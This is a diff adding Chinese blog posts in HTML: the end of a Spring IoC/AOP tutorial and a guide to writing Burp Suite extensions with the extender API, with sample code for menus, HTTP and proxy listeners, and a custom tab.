+</code></pre><p>作用是告诉Spring,bean都放在pojo这个包下。</p>
+<p>2.注解@Component,表示该类为bean    </p>
+<pre><code>@Component(&quot;p&quot;)
+public class Product {
+
+@Component(&quot;s&quot;)
+public class Source {
+</code></pre><p>3.因为配置在applicationContext.xml中已经删除,所以属性的初始化要在属性的声明时进行。            </p>
+<pre><code>private String name=&quot;product 1&quot;;
+private String name=&quot;test1&quot;;
+</code></pre><p>Product.java    </p>
+<pre><code>package pojo;
+
+import javax.annotation.Resource;
+
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.stereotype.Component;
+
+@Component(&quot;p&quot;)
+public class Product {
+private int id;
+private String name = &quot;product 2&quot;;
+
+@Autowired
+private Source source;
+
+public int getId() {
+    return id;
+}
+public void setId(int id) {
+    this.id = id;
+}
+public String getName() {
+    return name;
+}
+public void setName(String name) {
+    this.name = name;
+}
+public Source getSource() {
+    return source;
+}
+
+public void setSource(Source source) {
+    this.source = source;
+ }
+
+}
+</code></pre><h2 id="AOP-Aspect-Oriented-Program-面向切面编程-1"><a href="#AOP-Aspect-Oriented-Program-面向切面编程-1" class="headerlink" title="AOP(Aspect Oriented Program)面向切面编程"></a>AOP(Aspect Oriented Program)面向切面编程</h2><p>1.jar包:<a href="http://how2j.cn/frontdownload?bean.id=1810" target="_blank" rel="noopener">http://how2j.cn/frontdownload?bean.id=1810</a></p>
+<p>2.业务类:ProductService.java    </p>
+<pre><code>package service
+public class ProductService {
+
+public void doSomeService(){
+
+    System.out.println(&quot;doSomeService&quot;);
+
+}
+</code></pre><p>}</p>
+<p>3.准备日志切面LoggerAspect.java<br>功能:在调用核心功能之前和之后分别打印日志,切面就是原理图中讲的那些辅助功能.将来与某个核心功能编制后,用于实现核心功能的代码:<code>Object object = joinPoint.proceed();</code></p>
+<pre><code>package aspect;
+import org.aspectj.lang.ProceedingJoinPoint;
+
+public class LoggerAspect {
+
+    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
+        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
+        Object object = joinPoint.proceed();
+        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
+        return object;
+    }
+}
+</code></pre><p>4.applicationContext.xml</p>
+<pre><code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
+&lt;/bean&gt;   
+&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;
+
+&lt;aop:config&gt;
+    &lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;        
+    &lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
+    &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;
+    &lt;/aop:aspect&gt;
+&lt;/aop:config&gt;    
+</code></pre><p>大概讲以下这个xml的含义:<br>第一行:<code>&lt;bean name=&quot;se&quot; class=&quot;service.ProductService&quot;&gt;
+    &lt;/bean&gt;</code> 是声明业务对象的<br>第二行:<code>&lt;bean id=&quot;loggerAspect&quot; class=&quot;aspect.LoggerAspect&quot;/&gt;</code>是声明日志切面的<br>第三行:<code>&lt;aop:pointcut id=&quot;loggerCutpoint&quot; expression=&quot;execution(* service.ProductService.*(..)) &quot;/&gt;</code><br>表示id为该切入点的标识符,expression表示满足该正则的方法调用后,就会进行切面操作,类似于触发了切面。<br><code>expression</code>:第一个<em>表示返回任意类型,包名为<code>service.ProductService</code>开头的类的任意方法(第二个</em>表示任意方法)(..)表示参数的任意类型和个数。<br>简单来说,第三行代码意思就是service包中的ProductService类的任意一个函数被调用,不管返回值为什么,都会触发开关,去执行切面(相当于将业务对象于辅助功能编织在一起),也就是辅助功能:<br><code>&lt;aop:aspect id=&quot;logAspect&quot; ref=&quot;loggerAspect&quot;&gt;
+        &lt;aop:around pointcut-ref=&quot;loggerCutpoint&quot; method=&quot;log&quot;/&gt;</code><br>上面说的只要触发开关,就回去执行切面,这里所谓的切面其实就是一个类的方法而已。<br>id代表这个切面的名字,ref表明方法所在类,method代表方法的名字,<code>pointcut-ref=&quot;loggerCutpoint&quot;</code>表示这个切面与上面的切点关联起来的,只要上面的切点被触发,我就会在这里执行一些辅助功能。    <code>&lt;aop:around</code>表示执行的顺序。具体看AOP的基本概念。</p>
+<p>5.TestSpring.java    </p>
+<pre><code>package test;
+
+import org.springframework.context.ApplicationContext;
+import org.springframework.context.support.ClassPathXmlApplicationContext;
+import service.ProductService;
+
+public class TestSpring {
+public static void main(String[] args) {
+    ApplicationContext context = new ClassPathXmlApplicationContext(
+            new String[] { &quot;applicationContext.xml&quot; });
+    ProductService s = (ProductService) context.getBean(&quot;se&quot;);
+    s.doSomeService();
+}
+</code></pre><p>}</p>
+<p>执行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.24.40-image.png" alt="2019-01-10.17.24.40-image.png"></p>
+<h3 id="AOP的几个重要概念"><a href="#AOP的几个重要概念" class="headerlink" title="AOP的几个重要概念"></a>AOP的几个重要概念</h3><p>1.通知<br>定义了切面何时工作及工作内容,即什么时候去执行切面程序与功能具体的代码。这里一共有5种类型,分别为</p>
+<pre><code>a.Before 在方法之前调用通知
+b.After 在方法之后调用通知,无论是否执行成功
+c.around 在方法之前与之后都调用
+d.After-Return    方法执行成功后调用
+e.After-throwing    方法抛出异常后调用
+</code></pre><p>执行顺序:            </p>
+<p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.17.05.53-image.png" alt="2019-01-10.17.05.53-image.png">            </p>
+<p>&lt;aop:aspect id=”logAspect” ref=”loggerAspect”&gt;<br>            &lt;aop:around pointcut-ref=”loggerCutpoint” method=”log”/&gt;<br>        &lt;/aop:aspect&gt;</p>
+<p>2.连接点<br>在执行正常功能时,能够插入切面的点,连接点可以是调用方法时、抛出异常时、甚至修改字段时,在这些点,就可以去执行切面            </p>
+<p>3.切面<br>定义:切面是切点与通知的集合,通知和切点定义了切面的全部功能—(它是什么,在何时何处完成其功能)<br>声明切面:<code>&lt;aop:aspect&gt;</code>完成的,ref指定类,pointcut-ref,pointcut-ref表明与哪个切点联系,method指定要执行的方法。    </p>
+<p>4.切点<br>通知定义了”何时”与”什么”,而切点定义了”何处”<br>作用:定义通知被调用的位置(在哪些连接点)<br>声明切点：<br><strong>a.在\&lt;<a href="aop:config\" target="_blank" rel="noopener">aop:config\</a>&gt;标签下使用\&lt;<a href="aop:pointcut\" target="_blank" rel="noopener">aop:pointcut\</a>&gt;声明一个切入点Bean</strong>该切入点可被多个切面使用,对于需要共享的切入点最好使用该方式。</p>
+<pre><code>&lt;aop:config&gt;  
+   &lt;aop:pointcut id=&quot;pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
+   &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
+      &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
+   &lt;/aop:aspect&gt;  
+&lt;/aop:config&gt;
+</code></pre><p>&lt;aop:pointcut id=”loggerCutpoint” expression=”execution(<em> service.ProductService.</em>(..)) “/&gt;        </p>
+<p><strong>b.在<a href="aop:aspect" target="_blank" rel="noopener">aop:aspect</a>标签下使用<a href="aop:pointcut" target="_blank" rel="noopener">aop:pointcut</a>声明一个切入点Bean</strong>该切入点一般只用于该切面。</p>
+<pre><code>&lt;aop:config&gt;  
+ &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
+    &lt;aop:pointcut id=&quot; pointcut&quot; expression=&quot;execution(* cn.javass..*.*(..))&quot;/&gt;  
+    &lt;aop:before pointcut-ref=&quot;pointcut&quot; method=&quot;before&quot;/&gt;  
+ &lt;/aop:aspect&gt;  
+&lt;/aop:config&gt;  
+</code></pre><p><strong>c.匿名切入点Bean，可以在声明通知时通过pointcut属性指定切入点表达式，该切入点是匿名切入点，只被该通知使用</strong></p>
+<pre><code>&lt;aop:config&gt;  
+ &lt;aop:aspect ref=&quot;aspectSupportBean&quot;&gt;  
+     &lt;aop:after pointcut=&quot;execution(* cn.javass..*.*(..))&quot; method=&quot;afterFinallyAdvice&quot;/&gt;  
+ &lt;/aop:aspect&gt;  
+&lt;/aop:config&gt;  
+</code></pre><p>5.引入<br>允许我们向现有的类中添加方法或属性。        </p>
+<p>6.织入(未理解,先占坑,有时间回来描述)        </p>
+<h3 id="注解方式AOP"><a href="#注解方式AOP" class="headerlink" title="注解方式AOP"></a>注解方式AOP</h3><p>1.配置业务类    </p>
+<pre><code>@Component(&quot;se&quot;)
+public class ProductService {
+</code></pre><p>2.注解配置切面</p>
+<pre><code>@Aspect 注解表示这是一个切面
+@Component 表示这是一个bean,由Spring进行管理
+@Around(value = &quot;execution(* com.how2java.service.ProductService.*(..))&quot;) 表示对com.how2java.service.ProductService 这个类中的所有方法进行切面操作
+</code></pre><p>LoggerAspect.java</p>
+<pre><code>package aspect;
+
+import org.aspectj.lang.ProceedingJoinPoint;
+import org.aspectj.lang.annotation.Around;
+import org.aspectj.lang.annotation.Aspect;
+import org.springframework.stereotype.Component;
+
+
+@Aspect
+@Component
+public class LoggerAspect {
+
+    @Around(value = &quot;execution(* service.ProductService.*(..))&quot;)
+    public Object log(ProceedingJoinPoint joinPoint) throws Throwable {
+        System.out.println(&quot;start log:&quot; + joinPoint.getSignature().getName());
+        Object object = joinPoint.proceed();
+        System.out.println(&quot;end log:&quot; + joinPoint.getSignature().getName());
+        return object;
+    }
+}
+</code></pre><p>3.applicationContext.xml(关键)            </p>
+<pre><code>//扫描aspect与service包,定位业务类与切面类
+&lt;context:component-scan base-package=&quot;aspect&quot;/&gt;
+&lt;context:component-scan base-package=&quot;service&quot;/&gt; 
+
+//找到被注解了的切面类,进行切面设置
+&lt;aop:aspectj-autoproxy/&gt; 
+</code></pre><p>4.TestSpring.java与上一个xml设置的代码相同。<br>运行结果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.19.56.37-image.png" alt="2019-01-10.19.56.37-image.png">        </p>
+<h3 id="AOP注解方式测试"><a href="#AOP注解方式测试" class="headerlink" title="AOP注解方式测试"></a>AOP注解方式测试</h3><p>1.jar包下载:<br><a href="http://how2j.cn/frontdownload?bean.id=1189" target="_blank" rel="noopener">jubit.jar</a><br><a href="http://how2j.cn/frontdownload?bean.id=1190" target="_blank" rel="noopener">hamcrest.jar</a></p>
+<p>2.applicationContext.xml</p>
+<pre><code>&lt;context:component-scan base-package=&quot;pojo&quot;/&gt;
+</code></pre><p>3.Source.java</p>
+<pre><code>package pojo;
+
+import org.springframework.stereotype.Component;
+
+@Component(&quot;s&quot;)
+public class Source {
+    private int id;
+    private String name = &quot;test2&quot;;
+
+public int getId() {
+    return id;
+}
+public void setId(int id) {
+    this.id = id;
+}
+public String getName() {
+    return name;
+}
+public void setName(String name) {
+    this.name = name;
+}
+</code></pre><p>}</p>
+<p>3.TestSpring.java</p>
+<pre><code>package test;
+
+import org.junit.Test;
+import org.junit.runner.RunWith;
+import org.springframework.beans.factory.annotation.Autowired;
+import org.springframework.context.ApplicationContext;
+import org.springframework.context.support.ClassPathXmlApplicationContext;
+import org.springframework.test.context.ContextConfiguration;
+import org.springframework.test.context.junit4.SpringJUnit4ClassRunner;
+
+import pojo.Source;
+import service.ProductService;
+
+@RunWith(SpringJUnit4ClassRunner.class)
+@ContextConfiguration(&quot;classpath:applicationContext.xml&quot;)
+public class TestSpring {
+
+@Autowired
+Source s;
+
+@Test
+public void test() {
+    System.out.println(s.getName());
+    }
+}
+</code></pre><p>运行结果：<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-10.20.37.25-image.png" alt="2019-01-10.20.37.25-image.png">        </p>
+<p>参考:<br><a href="https://www.imooc.com/learn/196" target="_blank" rel="noopener">https://www.imooc.com/learn/196</a><br><a href="http://how2j.cn/k/spring/spring-ioc-di/87.html" target="_blank" rel="noopener">http://how2j.cn/k/spring/spring-ioc-di/87.html</a></p>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/09/Burp插件开发/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P0rZ9's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/01/09/Burp插件开发/" itemprop="url">Burp插件开发</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">Posted on</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-01-09T08:15:41+08:00">
+                2019-01-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <blockquote>
+<p>最近学习Java,想起以前大佬写的Burp插件,就照猫画虎写了几个简单的插件,简单记录下过程。</p>
+</blockquote>
+<hr>
+<p>关于Java基础语法移步笔者以前文章：<a href="https://p0rz9.github.io/2019/01/08/Java语法基础/" target="_blank" rel="noopener">https://p0rz9.github.io/2019/01/08/Java语法基础/</a></p>
+<h3 id="Java接口"><a href="#Java接口" class="headerlink" title="Java接口"></a>Java接口</h3><h4 id="接口简介"><a href="#接口简介" class="headerlink" title="接口简介"></a>接口简介</h4><blockquote>
+<p>接口（英文：Interface）在 Java 编程语言中是一个比较抽象的东西。熟悉 OOP 的同学可以用”类”的思想来理解接口。但是，要明白的是，类与接口有相似的地方同时也有很多不同的地方。</p>
+</blockquote>
+<h4 id="接口的声明"><a href="#接口的声明" class="headerlink" title="接口的声明"></a>接口的声明</h4><p>接口的声明语法格式如下：</p>
+<pre><code>[可见度] interface 接口名称 [extends 其他的类名] {
+        // 声明变量
+        // 抽象方法
+}
+</code></pre><p>Burp的接口声明</p>
+<pre><code>package burp;
+public interface IBurpExtender
+{
+    void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks);
+}
+</code></pre><h4 id="接口的实现"><a href="#接口的实现" class="headerlink" title="接口的实现"></a>接口的实现</h4><blockquote>
+<p>一个接口可以被另外一个接口继承，也可以被一个类实现。当类实现接口的时候，类要实现接口中所有的方法。否则，类必须声明为抽象的类。类使用implements关键字实现接口。</p>
+</blockquote>
+<p>实现接口的语法    </p>
+<pre><code>#!java
+... implements 接口名称[, 其他接口1, 其他接口2..., ...] ...
+</code></pre><hr>
+<h3 id="编写Burp插件"><a href="#编写Burp插件" class="headerlink" title="编写Burp插件"></a>编写Burp插件</h3><p>编写插件应该分为三步,导入Burp提供接口—&gt;编写功能代码—&gt;导入插件</p>
+<h4 id="导入Burp插件接口"><a href="#导入Burp插件接口" class="headerlink" title="导入Burp插件接口"></a>导入Burp插件接口</h4><p>1.将Burp提供的接口文件(Burp目录)导入Java项目中<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.28.35-image.png" alt="2019-01-09.16.28.35-image.png"><br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.30.37-image.png" alt="2019-01-09.16.30.37-image.png"></p>
+<h4 id="编写插件代码"><a href="#编写插件代码" class="headerlink" title="编写插件代码"></a>编写插件代码</h4><p>新建一个BurpExtender.java文件,这是编写插件必须要写的一个类,然后编写所要实现功能的代码</p>
+<h4 id="导出Jar文件并加载插件"><a href="#导出Jar文件并加载插件" class="headerlink" title="导出Jar文件并加载插件"></a>导出Jar文件并加载插件</h4><p>将上一步编写完成的插件,打包导入<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2019_1/2019-01-09.16.40.25-image.png" alt="2019-01-09.16.40.25-image.png"></p>
+<h3 id="BurpSuite官方接口"><a href="#BurpSuite官方接口" class="headerlink" title="BurpSuite官方接口"></a>BurpSuite官方接口</h3><p>其中最重要的就是编写代码部分,首先注意:<br>编写Burp插件必须编写BurpExtender类，实现接口IBurpExtender且声明为<code>public</code><br>IBurpExtender实现接口IBurpExtender,IProxyListener的demo:    </p>
+<pre><code>package burp;
+public class BurpExtender implements IBurpExtender{
+
+  // 实现 IBurpExtender 接口的 registerExtenderCallbacks 方法
+  @Override
+  public void registerExtenderCallbacks(IBurpExtenderCallbacks callbacks) {
+      // TODO here
+  }
+}
+</code></pre><p>Burp提供的接口类说明文档:<a href="https://portswigger.net/burp/extender/api/index.html" target="_blank" rel="noopener">https://portswigger.net/burp/extender/api/index.html</a><br>下面根据接口功能的不同对接口进行分类：</p>
+<p>1.插件入口和帮助接口类:<code>IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener</code></p>
+<pre><code>IBurpExtender接口类是Burp插件的入口，所有Burp的插件均需要实现此接口，并且 类命名为BurpExtender。IBurpExtenderCallbacks接口类是IBurpExtender接口的实现类与Burp其他各个组件（Scanner、Intruder、Spider……）、各个通信对象 （HttpRequestResponse、HttpService、SessionHandlingAction）之间的连接。 IExtensionHelpers、IExtensionStateListener这两个接口类是插件的帮助和管理操作的接口定义。IBurpExtender、IBurpExtenderCallbacks、 IExtensionHelpers、IExtensionStateListener
+</code></pre><p>2.UI相关接口类:<code>IContextMenuFactory、IContextMenuInvocation、ITab、ITextEditor、 IMessageEditor、IMenuItemHandler</code></p>
+<pre><code>这类接口类主要是定义Burp插件的UI显示和动作的处理事件，主要是软件交互中使用。
+</code></pre><p>3.Burp工具组件接口类:<code>IInterceptedProxyMessage、IIntruderAttack、 IIntruderPayloadGenerator、IIntruderPayloadGeneratorFactory、 IIntruderPayloadProcessor、IProxyListener、IScanIssue、IScannerCheck、 IScannerInsertionPoint、IScannerInsertionPointProvider、IScannerListener、IScanQueueItem、IScopeChangeListener</code></p>
+<pre><code>这些接口类的功能非常好理解，Burp在接口定义的命名中使用了的见名知意的规范，看到接口类的名称，基本就能猜测出来这个接口是适用于哪个工具组件。
+</code></pre><p>4.HTTP消息处理接口类：<code>ICookie、IHttpRequestResponsePersisted、IHttpRequestResponseWithMarkers、IHttpService、 IRequestInfo、IParameter、IResponseInfo</code></p>
+<pre><code>这些接口的定义主要是围绕HTTP消息通信过程中涉及的Cookie、Request、 Response、Parameter几大消息对象，通过对通信消息头、消息体的数据处理，来达到控制HTTP消息传递的目的。
+</code></pre><h4 id="几个写插件常用的接口"><a href="#几个写插件常用的接口" class="headerlink" title="几个写插件常用的接口:"></a>几个写插件常用的接口:</h4><p>1.<code>registerExtenderCallbacks</code>是IBurpExtender接口的实现类,与Burp的其他组件(Scanner Intruder Spider)及通信对象连接(HttpRequestResponse HttpService SessionHandlingAction)之间的连接。</p>
+<p>2.HTTP消息处理接口类:IHttpListener(注册Http监听器)  </p>
+<pre><code>//注册Http监听器
+public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo)
+{    
+//toolFlag:指示了发起请求或收到响应的 Burp 工具的 ID，所有的 toolFlag 定义在 IBurpExtenderCallbacks 接口中。
+//messageIsRequest:指示该消息是请求消息（值为True）还是响应消息（值为False）
+//messageInfo:被处理的消息的详细信息，是一个 IHttpRequestResponse 对象
+}
+</code></pre><p>3.<code>IHttpRequestResponse</code>类</p>
+<pre><code>byte[] request_by = messageInfo.getRequest();
+byte[] response = messageInfo.getResponse();
+IHttpService httpService = messageInfo.getHttpService();
+String Highlight = messageInfo.getHighlight();
+String Comment = messageInfo.getComment();
+</code></pre><p>4.<code>IHttpListener</code>接口<br>可通过调用IBurpExtenderCallbacks.registerHttpListener()注册一个HTTP监听器,Burp的任何一个接口发起HTTP请求或者收到HTTP响应都会通知此监听器。该接口可得到这些交互数据,进行分析和修改。<br>方法:        </p>
+<pre><code>void processHttpMessage(int toolFlag,boolean messageIsRequest,IHttpRequestResponse messageInfo);
+参数:toolFlag  发起或收到请求的插件ID,所有的ID已经在IBurpExtenderCallbacks定义好了。
+    boolean messageISRequest 提示该消息是请求消息(True)还是响应消息（False）
+    IHttpRequestResponse messageInfo 被处理的消息的详细消息,是一个IHttpRequestResponse对象
+</code></pre><p>5.<code>IContextMenuFactory</code>类实现菜单效果</p>
+<pre><code>package burp;
+
+import java.util.ArrayList;
+import java.util.List;
+import javax.swing.JMenu;
+import javax.swing.JMenuItem;
+
+public class BurpExtender implements IBurpExtender, IContextMenuFactory{
+
+@Override
+public void registerExtenderCallbacks(final IBurpExtenderCallbacks callbacks){
+
+    //插件名称
+    callbacks.setExtensionName(&quot;Her0in&quot;);
+
+    //注册菜单
+    callbacks.registerContextMenuFactory(this);
+}
+
+
+@Override
+public List&lt;JMenuItem&gt; createMenuItems(final IContextMenuInvocation invocation) {
+
+    List&lt;JMenuItem&gt; listMenuItems = new ArrayList&lt;JMenuItem&gt;();
+
+    //子菜单
+    JMenuItem menuItem;
+    menuItem = new JMenuItem(&quot;子菜单&quot;);  
+
+    //父级菜单
+    JMenu jMenu = new JMenu(&quot;父菜单&quot;);
+
+    //菜单操作
+    jMenu.add(menuItem);        
+    listMenuItems.add(jMenu);
+
+
+    return listMenuItems;
+}
+
+
+@Override
+public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
+        BurpExtender helpers) {
+    // TODO Auto-generated method stub
+
+}
+</code></pre><p>}</p>
+<p>加载插件:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.22.20-image.png" alt="2018-12-11.16.22.20-image.png"></p>
+<p>查看效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.16.23.21-image.png" alt="2018-12-11.16.23.21-image.png"></p>
+<p>6.<code>ICookie</code>接口    </p>
+<pre><code>// 此方法用于获取 Cookie 的域
+java.lang.String    getDomain()
+
+// 此方法用于获取 Cookie 的过期时间
+java.util.Date  getExpiration()
+
+// 此方法用于获取 Cookie 的名称
+java.lang.String    getName()
+
+// 此方法用于获取 Cookie 的路径
+java.lang.String    getPath()
+
+// 此方法用于获取 Cookie 的值
+java.lang.String    getValue()
+</code></pre><p>7.<code>IExtensionHelpers</code>接口:<br>此接口提供很多常用的辅助方法,可通过调用<code>IBurpExtenderCallbacks.getHelpers</code>获得此接口的实例。    </p>
+<pre><code>byte[]  addParameter(byte[] request, IParameter parameter) //添加参数到指定的请求中,并更新Content-Length
+
+IRequestInfo analyzeRequest(byte[] request)  //分析request的请求信息
+IResponseInfo analyzeResponse(byte[] response)  //分析response的响应消息
+
+byte[]  buildHttpMessage(java.util.List&lt;java.lang.String&gt; headers, byte[] body)  //构建请求包,返回响应报
+
+
+byte[]  buildHttpRequest(java.net.URL url) //向指定的url发起get请求
+java.lang.String    bytesToString(byte[] data)   //bytes到String的转换
+java.lang.String    bytesToString(byte[] data)   //String到bytes的转换
+
+
+实例：
+private IExtensionHelpers helpers;
+
+this.helpers = callbacks.getHelpers();
+
+byte[] request = messageInfo.getRequest();
+IRequestInfo a = helpers.analyzeRequest(request);
+</code></pre><p>8.<code>IHttpRequestResponse</code>接口<br>该接口用于检索与更新有关HTTP消息的详细信息    </p>
+<pre><code>java.lang.String getComment()          //获取用户的标注信息
+java.lang.String getHighlight()       /获取用户标注的高亮信息
+IHttpService getHttpService()   //获取请求响应的http服务信息    
+
+byte[]  getRequest()  // 获取 HTTP 请求信息
+byte[]  getResponse()  // 获取 HTTP 响应信息
+
+void    setHttpService(IHttpService httpService)  //更新请求/响应HTTP服务信息
+void    setRequest(byte[] message)    // 更新 HTTP 请求信息
+void    setResponse(byte[] message)  // 更新 HTTP 响应信息
+</code></pre><p>9.<code>IHttpService</code>接口<br>此接口用于提供关于 HTTP 服务信息的细节    </p>
+<pre><code>java.lang.String getHost()    
+int getPort()    
+java.lang.String getProtocol()    
+
+
+例子:
+public void processHttpMessage(int toolFlag, boolean messageIsRequest,
+        IHttpRequestResponse messageInfo) {
+
+    IHttpService iHttpService = messageInfo.getHttpService();
+
+    this.stdout.println(&quot;Host:&quot;+iHttpService.getHost());
+    this.stdout.println(&quot;Port:&quot;+iHttpService.getPort());
+    this.stdout.println(&quot;Protocol:&quot;+iHttpService.getProtocol());
+}
+</code></pre><p>在放掉拦截的数据包后,效果:<br><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.18.01.11-image.png" alt="2018-12-11.18.01.11-image.png"></p>
+<p>10.<code>IInterceptedProxyMessage</code>接口<br>该接口不能被扩展实现,它表示已被Burp代理拦截的HTTP消息。我们可以利用接口注册一个IProxyListener以得到代理消息的细节。    </p>
+<pre><code>callbacks.registerProxyListener(this);  //注册代理监听器
+
+IHttpRequestResponse message1 = message.getMessageInfo();  //请求的详细信息
+int action = message.getInterceptAction();      //当前的拦截操作类型    
+
+//获取客户端的Ip,即代理Ip
+stdout.println(message.getClientIpAddress());
+
+//获取当前的拦截操作类型  
+stdout.println(action);
+
+//获取请求的详细信息
+stdout.println(message1);
+
+// Drop 掉所有请求
+//message.setInterceptAction(IInterceptedProxyMessage.ACTION_DROP);
+</code></pre><p>11.<code>Itab</code>接口:</p>
+<pre><code>package burp;
+import java.awt.Component;
+import java.io.PrintWriter;
+
+import javax.swing.JButton;
+import javax.swing.JPanel;
+import javax.swing.SwingUtilities;
+
+public class BurpExtender implements IBurpExtender, ITab {
+      public PrintWriter stdout;
+      public IExtensionHelpers helpers;
+      private JPanel jPanel1;
+      private JButton jButton1;
+
+  @Override
+  public void registerExtenderCallbacks( final IBurpExtenderCallbacks callbacks) {
+
+      this.stdout = new PrintWriter(callbacks.getStdout(), true);
+      this.helpers = callbacks.getHelpers();
+
+      //设置扩展名
+      callbacks.setExtensionName(&quot;JSON劫持检测&quot;);
+
+       //创建我们的窗体
+       SwingUtilities.invokeLater(new Runnable() {
+            @Override
+            public void run() {
+                 //我们的主窗体
+                 jPanel1 = new JPanel();
+                 jButton1 = new JButton(&quot;测试按钮&quot;);
+
+                 //将按钮添加到面板中
+                 jPanel1.add(jButton1);
+
+                 //自定义我们的组件
+                 callbacks.customizeUiComponent(jPanel1);
+                 //添加标签到Burp主窗体
+                 callbacks.addSuiteTab(BurpExtender.this);
+            }
+       });
+  }
+  @Override
+  public String getTabCaption() {
+       return &quot;JSON劫持检测&quot; ;
+  }
+
+  @Override
+  public Component getUiComponent() {
+       return jPanel1;
+  }
+
+@Override
+public void processHttpMessage(int toolFlag, boolean messageIsRequest, IHttpRequestResponse messageInfo,
+        BurpExtender helpers) {
+    // TODO Auto-generated method stub        
+}
+}
+</code></pre><p><img src="https://raw.githubusercontent.com/P0rZ9/img/master/2018_12/2018-12-11.22.21.12-image.png" alt="2018-12-11.22.21.12-image.png"></p>
+<p>我们也可以学习官方插件代码,下载JD-GUI工具:<br><a href="https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml" target="_blank" rel="noopener">https://www.softpedia.com/get/Programming/Debuggers-Decompilers-Dissasemblers/JD-GUI.shtml</a><br>在burpsuite安装目录下的bapps目录下存放已经安装的插件源代码,用下载的JD-GUI直接打开即可看到源码。</p>
+<h3 id="实战编写"><a href="#实战编写" class="headerlink" title="实战编写"></a>实战编写</h3><p>Jsonp劫持插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Json_Hijacking" target="_blank" rel="noopener">插件源码</a></p>
+<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Json_Hijacking/Burp/Json_Hijacking.jar" target="_blank" rel="noopener">插件成品</a></p>
+<p>Http请求入库插件:<br><a href="https://github.com/P0rZ9/Burp_Extender/tree/master/Http_to_Mysql/Http_to_Mysql" target="_blank" rel="noopener">插件源码</a></p>
+<p><a href="https://github.com/P0rZ9/Burp_Extender/raw/master/Http_to_Mysql/Http_to_Mysql/http-to-mysql.jar" target="_blank" rel="noopener">插件成品</a></p>
+<p><strong>注:如插件要导入其他扩展包,如需要使用数据库操作(需导入mysql-connector-java-bin.jar),在加载到Burp时应将几个Jar打包为一个文件:</strong></p>
+<pre><code>1.将项目引入的jar包跟项目导出的包放入当前目录下
+2..将包分别解压
+  jar -xvf 1.jar
+  jar -xvf 2.jar
+  jar -xvf 引入的jar包
+3.将所有jar包移出当前目录
+4.将当前目录文件打包为一个jar文件
+  jar -cvfM result.jar .   (别忘了.)
+5.导入BurpSuite即可  
+</code></pre>
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/01/08/Java语法基础/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="P0rZ9">
+      <meta itemprop="description" content="">
